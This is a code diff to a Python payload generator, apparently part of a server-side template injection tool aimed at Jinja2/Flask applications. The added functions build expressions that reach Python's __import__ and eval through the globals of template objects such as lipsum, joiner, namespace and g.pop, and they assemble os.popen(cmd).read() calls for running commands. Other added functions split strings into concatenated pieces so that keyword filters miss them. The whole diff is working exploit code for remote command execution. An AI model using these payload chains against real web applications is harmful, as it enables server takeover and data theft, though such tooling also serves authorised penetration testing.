@@ -69,6 +69,7 @@ class PayloadGenerator:
                 (lambda gen_req: (gen_req[1], {})),
             ),
             ((lambda gen_req: gen_req[0] == UNSATISFIED), (lambda gen_req: None)),
+            ((lambda gen_req: gen_req[0] == ONEOF), self.oneof_generate),
             (
                 (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
                 (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]})),
@@ -80,7 +81,7 @@ class PayloadGenerator:
             ((lambda gen_req: True), self.common_generate),
         ]
         self.used_count = defaultdict(int)
-
+        self.detect_mode = detect_mode
         if detect_mode == DETECT_MODE_FAST:
             for k in gen_weight_default:
                 self.used_count[k] += gen_weight_default[k]
@@ -110,6 +111,14 @@ class PayloadGenerator:
             return None
         return str_result, used_context
 
+    def oneof_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
+        _, *reqs = gen_req
+        for req in reqs:
+            ret = self.generate_by_list(req)
+            if ret is not None:
+                return ret
+        return None
+
     def common_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
         gen_type: str
         gen_type, *args = gen_req
@@ -118,7 +127,8 @@ class PayloadGenerator:
             return None
 
         gens = req_gens[gen_type].copy()
-        gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
+        if self.detect_mode == DETECT_MODE_FAST:
+            gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
             gen_ret: ReqGenReturn = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
@@ -904,7 +914,43 @@ def gen_string_context(context: dict, value: str):
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
+@req_gen
+def gen_string_twostringconcat(context: dict, value: str):
+    if len(value) <= 2 or len(value) > 20:
+        return [
+            (UNSATISFIED, )
+        ]
+    return [
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "'{}'".format(value[:i].replace("'", "\\'"))),
+                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'")))
+                ]
+                for i in range(1, len(value) - 1)
+            ]
+        )
+    ]
 
+@req_gen
+def gen_string_twostringconcat2(context: dict, value: str):
+    if len(value) <= 2 or len(value) > 20:
+        return [
+            (UNSATISFIED, )
+        ]
+    return [
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "\"{}\"".format(value[:i].replace("\"", "\\\""))),
+                    (LITERAL, "\"{}\"".format(value[i:].replace("\"", "\\\"")))
+                ]
+                for i in range(1, len(value) - 1)
+            ]
+        )
+    ]
 
 @req_gen
 def gen_string_concat1(context: dict, value: str):
@@ -1229,8 +1275,71 @@ def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
 
 # ---
 
+@req_gen
+def gen_import_func_g(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "g"),
+        (ATTRIBUTE, "pop"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "__import__")
+    )]
+
+
+@req_gen
+def gen_import_func_lipsum(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "lipsum"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
+
+
+@req_gen
+def gen_import_func_joiner(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "joiner"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
+
+
+@req_gen
+def gen_import_func_namespace(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "namespace"),
+        (ATTRIBUTE, "__init__"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "__import__")
+    )]
+
+
 
 # ---
+
+
+@req_gen
+def gen_eval_func_g(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "g"),
+        (ATTRIBUTE, "pop"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "eval")
+    )]
 
 
 @req_gen
@@ -1271,16 +1380,6 @@ def gen_eval_func_namespace(context):
         (ITEM, "eval")
     )]
 
-@req_gen
-def gen_eval_func_g(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "g"),
-        (ATTRIBUTE, "pop"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
 
 # ---
 
@@ -1338,16 +1437,14 @@ def gen_config_self(context):
 # ---
 
 
-# @req_gen
-# def gen_module_os_urlfor(context):
-#     return [
-#         (
-#             CHAINED_ATTRIBUTE_ITEM,
-#             (LITERAL, "url_for"),
-#             (ATTRIBUTE, "__globals__"),
-#             (ITEM, "os"),
-#         )
-#     ]
+@req_gen
+def gen_module_os_import(context):
+    return [
+        (IMPORT_FUNC, ),
+        (LITERAL, "("),
+        (STRING, "os"),
+        (LITERAL, ")"),
+    ]
 
 
 @req_gen
@@ -1405,6 +1502,14 @@ def gen_os_popen_read_normal(context, cmd):
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
+    ]
+
+@req_gen
+def gen_os_popen_read_normalspace(context, cmd):
+    return [
+        (LITERAL, "("),
+        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
+        (LITERAL, "( ))"),
     ]
 
 @req_gen
